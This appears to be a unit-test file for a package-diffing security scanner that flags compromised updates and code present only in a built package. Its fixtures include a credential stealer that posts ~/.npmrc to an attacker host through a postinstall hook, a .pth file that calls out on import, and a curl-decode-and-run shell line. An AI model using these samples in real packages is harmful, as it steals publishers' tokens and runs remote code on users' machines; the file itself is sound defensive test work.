"""pah diff: what a new version does that the old one did not, and what a package has that its source does not."""
from __future__ import annotations

import json
import os
import shutil
import sys
import tarfile
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
os.environ.setdefault("PAH_HOME", tempfile.mkdtemp(prefix="pah-test-home-"))

from pah.capabilities import dependencies, of_file  # noqa: E402
from pah.diff import diff  # noqa: E402

PKG_V1 = {"name": "tiny-helper", "version": "1.0.0", "main": "lib/index.js", "dependencies": {"left-pad": "1.3.0"}}
LIB = "module.exports = (s) => s.trim();\n"
STEALER = ("const fs = require('fs'); const os = require('os'); const https = require('https');\n"
           "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
           "const req = https.request({ host: 'collector.attacker.invalid', method: 'POST', path: '/u' });\n"
           "req.write(npmrc); req.end();\n")


class DiffTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="pah-test-diff-"))
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def tree(self, name: str, files: dict[str, str]) -> Path:
        root = self.tmp / name
        for rel, text in files.items():
            p = root / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(text if isinstance(text, str) else json.dumps(text), encoding="utf-8")
        return root

    def test_compromised_update_blocks(self):
        v1 = self.tree("v1", {"package.json": PKG_V1, "lib/index.js": LIB})
        v2 = self.tree("v2", {"package.json": {**PKG_V1, "version": "1.0.1", "scripts": {"postinstall": "node setup.js"},
                                               "dependencies": {"left-pad": "1.3.0", "proc-macro-x": "1.0.0"}},
                              "lib/index.js": LIB, "setup.js": STEALER})
        rep = diff(str(v1), str(v2))
        self.assertEqual(rep.verdict, "block")
        rules = {f.rule for f in rep.findings}
        self.assertTrue({"PAH-D001", "PAH-C004"} <= rules, rules)
        d = rep.stats["diff"]
        self.assertEqual(d["added"], ["setup.js"])
        gained = {c["path"]: set(c["gained"]) for c in d["capabilities"]}
        self.assertTrue({"network", "credentials"} <= gained["setup.js"])
        self.assertIn("install-time", gained["package.json"])
        self.assertEqual(d["new_dependencies"], {"package.json": ["proc-macro-x"]})

    def test_ordinary_update_stays_quiet(self):
        v1 = self.tree("v1", {"package.json": PKG_V1, "lib/index.js": LIB, "README.md": "# tiny\n"})
        v2 = self.tree("v2", {"package.json": {**PKG_V1, "version": "1.1.0"}, "README.md": "# tiny\n\nNow with pad.\n",
                              "lib/index.js": LIB + "module.exports.pad = (s, n) => s.padStart(n);\n"})
        rep = diff(str(v1), str(v2))
        self.assertEqual(rep.verdict, "pass")
        self.assertEqual(rep.findings, [])
        self.assertEqual(rep.stats["diff"]["files"]["changed"], 3)

    def test_moved_lines_are_not_new(self):
        v1 = self.tree("v1", {"package.json": {**PKG_V1, "scripts": {"postinstall": "node setup.js"}}, "setup.js": STEALER})
        v2 = self.tree("v2", {"package.json": {**PKG_V1, "version": "1.0.1", "scripts": {"postinstall": "node setup.js"}},
                              "setup.js": "\n\n// formatting only\n" + STEALER})
        rep = diff(str(v1), str(v2))
        self.assertEqual([f.rule for f in rep.findings], [], "a finding that only moved is not new")
        self.assertEqual(rep.stats["diff"]["old_verdict"], "block")

    def test_archive_lines_up_with_folder(self):
        v1 = self.tree("v1", {"package.json": PKG_V1, "lib/index.js": LIB})
        tgz = self.tmp / "tiny-helper-1.0.0.tgz"
        with tarfile.open(tgz, "w:gz") as t:
            for p in sorted(v1.rglob("*")):
                if p.is_file():
                    t.add(p, arcname="package/" + p.relative_to(v1).as_posix())
        rep = diff(str(tgz), str(v1))
        self.assertEqual(rep.stats["diff"]["files"], {"added": 0, "removed": 0, "changed": 0, "same": 2})
        self.assertEqual(rep.verdict, "pass")

    def test_source_mode_flags_code_only_in_the_package(self):
        src = self.tree("src", {"pyproject.toml": "[project]\nname = 'tiny'\nversion = '1.0.0'\n",
                                "tiny/__init__.py": "def hello():\n    return 'hi'\n"})
        pkg = self.tree("pkg", {"pyproject.toml": "[project]\nname = 'tiny'\nversion = '1.0.0'\n",
                                "tiny/__init__.py": "def hello():\n    return 'hi'\n",
                                "tiny-1.0.0.dist-info/RECORD": "tiny/__init__.py,,\n",
                                "tiny_init.pth": "import os, urllib.request; urllib.request.urlopen('https://c.invalid/'"
                                                 " + os.environ.get('HOME', ''))\n"})
        rep = diff(str(src), str(pkg), source=True)
        self.assertEqual(rep.verdict, "block")
        d002 = [f for f in rep.findings if f.rule == "PAH-D002"]
        self.assertEqual([f.path for f in d002], ["tiny_init.pth"])
        self.assertNotIn("tiny-1.0.0.dist-info/RECORD", rep.stats["diff"]["added"])

    def test_source_mode_ignores_rewritten_manifest_versions(self):
        src = self.tree("src", {"package.json": {**PKG_V1, "dependencies": {"core": "workspace:*"}}, "lib/index.js": LIB})
        pkg = self.tree("pkg", {"package.json": {**PKG_V1, "dependencies": {"core": "1.0.0"}}, "lib/index.js": LIB})
        rep = diff(str(src), str(pkg), source=True)
        self.assertEqual([f.rule for f in rep.findings], [])


class CapabilityTests(unittest.TestCase):
    def test_capabilities_and_hooks(self):
        caps = of_file("scripts/x.sh", b"", "curl -s https://c.invalid/p | base64 -d > /tmp/t && sh /tmp/t\n")
        self.assertTrue({"network", "decoding"} <= set(caps))
        self.assertIn("install-time", of_file("ext/x/extconf.rb", b"", "require 'mkmf'\ncreate_makefile('x')\n"))
        self.assertIn("install-time", of_file("build.rs", b"", "fn main() {}\n"))
        self.assertEqual(of_file("README.md", b"", "Run `curl https://example.com | sh` to install.\n"), {})
        self.assertEqual(of_file("bin/tool", b"\x7fELF\x02\x01", None), {"native-code": "compiled program"})

    def test_dependencies(self):
        self.assertEqual(dependencies("Cargo.toml", "[package]\nname='a'\n[dependencies]\nserde = '1'\n"
                                      "proc-macro1 = '1.0.107'\n[dev-dependencies]\ntokio = '1'\n"),
                         {"serde", "proc-macro1"})
        self.assertEqual(dependencies("x.gemspec", "s.add_dependency 'rake'\ns.add_runtime_dependency('json')\n"),
                         {"rake", "json"})
        self.assertEqual(dependencies("requirements.txt", "requests==2.32.0\n# c\nflask>=3\n"), {"requests", "flask"})


if __name__ == "__main__":
    unittest.main()
